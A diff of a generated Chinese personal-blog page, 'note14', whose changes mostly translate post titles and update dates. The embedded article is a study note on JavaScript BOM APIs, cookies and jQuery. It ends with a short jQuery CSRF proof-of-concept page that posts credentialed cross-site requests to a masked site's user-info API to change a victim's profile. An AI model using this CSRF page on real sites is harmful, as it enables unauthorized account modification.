@@ -6,25 +6,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>note14 - han个人博客</title>
+    <title>笔记14 - han个人博客</title>
     <meta name="author" content="han">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: JS BOM和jQuery，以及php环境的搭建\n\n\n\n\n1. JS BOMBOM全名Browser Object Model，即浏览器对象模型。\n\nWindow方法\n12345678#打开新窗口window.open()#关闭当前窗口window.close()#移动当前窗口window.moveTo()#调整当前窗口的尺寸window.resizeTo()\n\nScreen屏幕\n1234#可用的屏幕宽度screen.availWidth#可用的屏幕高度screen.availHeight\n\nLocation\n1234567891011121314#web主机的域名location.hostname#当前页面的路径和文件名location.pathname#web主机的端口（80和443）location.port#使用的web协议（http或https）location.protocol#返回当前页面的URL（也可以用作跳转）location.href#返回URL的路径名location.pathname#加载新的文档location.assign\n\nHistory\n1234#与在浏览器点击后退按钮相同history.back()#与在浏览器点击向前按钮相同history.forward()\n\nNavigator\n12345678910111213141516171819&lt;html&gt;    &lt;head&gt;    \t&lt;meta charset=\"utf-8\"&gt;        &lt;title&gt;navigator用法&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=\"example\"&gt;&lt;/div&gt;        &lt;script&gt;        \ttxt = \"&lt;p&gt;浏览器代号：\" + navigator.appCodeName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器名称：\" + navigator.appName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器版本：\" + navigator.appVersion + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;启用Cookies: \" + navigator.cookieEnabled + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;硬件平台：\" + navigator.platform + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理：\" + navigator.userAgent + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理语言：\" + navigator.systemLanguage + \"&lt;/p&gt;\";            document.getElementById(\"example\").innerHTML = txt;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n弹窗\n123456#警告框window.alert(\"sometext\")#确认框window.confirm(\"sometext\")#提示框window.prompt(\"sometext\", \"defaultvalue\")\n\n计时\n12345678#间隔指定的毫秒数不停的执行指定代码window.setInterval(\"javascript function\", milliseconds)#停止setInterval()方法执行的函数代码window.clearInterval(intervalVariable)#第二个参数指示从当前起多少毫秒后执行第一个参数window.setTimeout(\"js function\", milliseconds)#用于停止执行setTimeout()方法的函数代码window.clearTimeout(timeoutVariable)\n\nCookie\ncookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。\ncookie的作用就是用于解决“如何记录客户端的用户信息”\n12* 当用户访问web页面时，他的名字可以记录在cookie中* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录\n\n1234#创建cookiedocument.cookie=\"username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/\";#读取cookievar x = document.cookie;\n\n\n\n2. JQuery​    内容比较细碎，多看看jQuery教程\n​    使用jQuery对***账户进行CSRF攻击，代码如下：\n123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt;    &lt;title&gt;hack***&lt;/title&gt;    &lt;script src=\"https://libs.baidu.com/jquery/2.0.0/jquery.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt;        $.ajax(&#123;        type:'POST',        url:\"http://www.***.com/api/user/info\",        dataType:'json',        data: &#123;            allow_status:\"1\",            heading:\"\",            id_number:\"123456789123456789\",            nickname:\"wangyingminghanpi\",            real_name:\"本币\",            user_tag:'[]',        &#125;,        xhrFields:&#123;            withCredentials:true  //支持附带详细信息,可以携带cookie        &#125;,        crossDomain: true,//请求偏向外域,支持跨域请求        success: function (data) &#123;          console.log(data);      &#125;      &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n","dateCreated":"2019-08-01T20:35:57+08:00","dateModified":"2019-08-02T22:21:17+08:00","datePublished":"2019-08-01T20:35:57+08:00","description":"Abstract: JS BOM和jQuery，以及php环境的搭建","headline":"note14","image":["https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/01/note14/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/01/note14/","keywords":"DOM, BOM, jQuery","thumbnailUrl":"https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: JS BOM和jQuery，以及php环境的搭建\n\n\n\n\n1. JS BOMBOM全名Browser Object Model，即浏览器对象模型。\n\nWindow方法\n12345678#打开新窗口window.open()#关闭当前窗口window.close()#移动当前窗口window.moveTo()#调整当前窗口的尺寸window.resizeTo()\n\nScreen屏幕\n1234#可用的屏幕宽度screen.availWidth#可用的屏幕高度screen.availHeight\n\nLocation\n1234567891011121314#web主机的域名location.hostname#当前页面的路径和文件名location.pathname#web主机的端口（80和443）location.port#使用的web协议（http或https）location.protocol#返回当前页面的URL（也可以用作跳转）location.href#返回URL的路径名location.pathname#加载新的文档location.assign\n\nHistory\n1234#与在浏览器点击后退按钮相同history.back()#与在浏览器点击向前按钮相同history.forward()\n\nNavigator\n12345678910111213141516171819&lt;html&gt;    &lt;head&gt;    \t&lt;meta charset=\"utf-8\"&gt;        &lt;title&gt;navigator用法&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div id=\"example\"&gt;&lt;/div&gt;        &lt;script&gt;        \ttxt = \"&lt;p&gt;浏览器代号：\" + navigator.appCodeName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器名称：\" + navigator.appName + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;浏览器版本：\" + navigator.appVersion + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;启用Cookies: \" + navigator.cookieEnabled + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;硬件平台：\" + navigator.platform + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理：\" + navigator.userAgent + \"&lt;/p&gt;\";            txt += \"&lt;p&gt;用户代理语言：\" + navigator.systemLanguage + \"&lt;/p&gt;\";            document.getElementById(\"example\").innerHTML = txt;        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;\n\n弹窗\n123456#警告框window.alert(\"sometext\")#确认框window.confirm(\"sometext\")#提示框window.prompt(\"sometext\", \"defaultvalue\")\n\n计时\n12345678#间隔指定的毫秒数不停的执行指定代码window.setInterval(\"javascript function\", milliseconds)#停止setInterval()方法执行的函数代码window.clearInterval(intervalVariable)#第二个参数指示从当前起多少毫秒后执行第一个参数window.setTimeout(\"js function\", milliseconds)#用于停止执行setTimeout()方法的函数代码window.clearTimeout(timeoutVariable)\n\nCookie\ncookie是一些数据，存储于电脑上的文本文件中。当web服务器向浏览器发送web页面时，在连接关闭后，服务端不会记录用户信息。\ncookie的作用就是用于解决“如何记录客户端的用户信息”\n12* 当用户访问web页面时，他的名字可以记录在cookie中* 在用户下一次访问该页面时，可以在cookie中读取用户访问记录\n\n1234#创建cookiedocument.cookie=\"username=John Doe; expires=Thu, 18 Dec 2043 12:00:00 GMT; path=/\";#读取cookievar x = document.cookie;\n\n\n\n2. JQuery​    内容比较细碎，多看看jQuery教程\n​    使用jQuery对***账户进行CSRF攻击，代码如下：\n123456789101112131415161718192021222324252627282930313233&lt;html&gt;&lt;head&gt;    &lt;title&gt;hack***&lt;/title&gt;    &lt;script src=\"https://libs.baidu.com/jquery/2.0.0/jquery.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt;        $.ajax(&#123;        type:'POST',        url:\"http://www.***.com/api/user/info\",        dataType:'json',        data: &#123;            allow_status:\"1\",            heading:\"\",            id_number:\"123456789123456789\",            nickname:\"wangyingminghanpi\",            real_name:\"本币\",            user_tag:'[]',        &#125;,        xhrFields:&#123;            withCredentials:true  //支持附带详细信息,可以携带cookie        &#125;,        crossDomain: true,//请求偏向外域,支持跨域请求        success: function (data) &#123;          console.log(data);      &#125;      &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\n","dateCreated":"2019-08-01T20:35:57+08:00","dateModified":"2019-09-09T13:35:45+08:00","datePublished":"2019-08-01T20:35:57+08:00","description":"Abstract: JS BOM和jQuery，以及php环境的搭建","headline":"笔记14","image":["https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/01/note14/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/01/note14/","keywords":"DOM, BOM, jQuery","thumbnailUrl":"https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500"}</script>
     <meta name="description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
 <meta name="keywords" content="DOM,BOM,jQuery">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="note14">
+<meta property="og:title" content="笔记14">
 <meta property="og:url" content="http://yoursite.com/2019/08/01/note14/index.html">
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-02T14:21:17.459Z">
+<meta property="og:updated_time" content="2019-09-09T05:35:45.411Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="note14">
+<meta name="twitter:title" content="笔记14">
 <meta name="twitter:description" content="Abstract: JS BOM和jQuery，以及php环境的搭建">
     
     
@@ -261,7 +261,7 @@
         <div class="post-header main-content-wrap text-center">
     
         <h1 class="post-title">
-            note14
+            笔记14
         </h1>
     
     
@@ -352,8 +352,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/03/note15/"
-                    data-tooltip="note15"
-                    aria-label="PREVIOUS: note15"
+                    data-tooltip="笔记15"
+                    aria-label="PREVIOUS: 笔记15"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -366,8 +366,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/01/note13/"
-                    data-tooltip="note13"
-                    aria-label="NEXT: note13"
+                    data-tooltip="笔记13"
+                    aria-label="NEXT: 笔记13"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -467,8 +467,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/03/note15/"
-                    data-tooltip="note15"
-                    aria-label="PREVIOUS: note15"
+                    data-tooltip="笔记15"
+                    aria-label="PREVIOUS: 笔记15"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -481,8 +481,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/01/note13/"
-                    data-tooltip="note13"
-                    aria-label="NEXT: note13"
+                    data-tooltip="笔记13"
+                    aria-label="NEXT: 笔记13"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -670,7 +670,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
                         </a>
@@ -680,9 +680,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
-                            <h3 class="media-heading">dvwa-deploy</h3>
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -735,8 +735,8 @@
                     <div class="media-left">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
                         </a>
@@ -745,10 +745,10 @@
                     <div class="media-body">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
-                            <h3 class="media-heading">note11</h3>
+                            <h3 class="media-heading">笔记11</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -770,7 +770,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -780,9 +780,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
-                            <h3 class="media-heading">week2sum</h3>
+                            <h3 class="media-heading">第二周总结</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -791,7 +791,7 @@
                                 
                             </span>
                         </span>
-                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
                     </div>
                     <div style="clear:both;"></div>
                     <hr>
@@ -869,7 +869,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
                         </a>
@@ -879,9 +879,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
-                            <h3 class="media-heading">note12</h3>
+                            <h3 class="media-heading">笔记12</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -902,7 +902,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
                         </a>
@@ -912,9 +912,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
-                            <h3 class="media-heading">note13</h3>
+                            <h3 class="media-heading">笔记13</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -935,7 +935,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
                             <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                         </a>
@@ -945,9 +945,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
-                            <h3 class="media-heading">note14</h3>
+                            <h3 class="media-heading">笔记14</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -968,7 +968,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -978,9 +978,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
-                            <h3 class="media-heading">note15</h3>
+                            <h3 class="media-heading">笔记15</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
